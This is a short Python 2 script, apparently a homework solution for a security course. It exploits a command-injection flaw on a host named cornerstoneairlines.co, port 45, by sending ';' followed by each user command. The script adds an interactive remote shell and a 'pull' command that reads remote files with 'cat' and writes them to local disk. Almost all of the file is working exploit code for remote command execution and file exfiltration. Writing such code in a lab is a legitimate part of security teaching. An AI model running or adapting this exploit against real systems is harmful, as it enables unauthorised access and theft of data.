"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import subprocess
import time
import os.path
host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd(cmd): 
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    connection = s.connect((host, port))

    time.sleep(2)
    output = s.recv(1024)
    time.sleep(2)
    s.send(";"+cmd+"\n")
    time.sleep(2)
    exec_code = s.recv(1024)
    s.close()

    return exec_code

if __name__ == '__main__':
    directory = "/"
    cmd = raw_input(">")
    while(cmd != "quit"):
        if(cmd == "help"):
            print("shell : Drop into an interactive shell and allow users to gracefully exit")
            print("pull <remote-path> <local-path> : Download files")
            print("help : Shows this help menu")
            print("quit : Quit the shell")
        elif(cmd == "shell"):
            newCmd = raw_input(directory+">")
            while(newCmd != "exit"):
                if("cd" in newCmd):
                    command = newCmd + ";" + "pwd"
                    x = execute_cmd(command)
                    directory = x
                else:
                    command = "cd " + directory.rstrip() + ";" + newCmd
                    print(execute_cmd(command))
                newCmd = raw_input(directory.rstrip()+">")
        elif("pull" in cmd):
            pull = cmd.split()
            temp = pull[1].split("/")
            command = "cd "

            for x in temp:
                if("." not in x):
                    command += x + "/"

            size = len(temp)
            command += ";cat " + temp[size - 1]

            x = execute_cmd(command)

            save_path = pull[2]

            with open(save_path, "w") as file1:
                file1.write(x)
            file1.close()
        else:
            print("shell : Drop into an interactive shell and allow users to gracefully exit")
            print("pull <remote-path> <local-path> : Download files")
            print("help : Shows this help menu")
            print("quit : Quit the shell")
        cmd = raw_input(">")
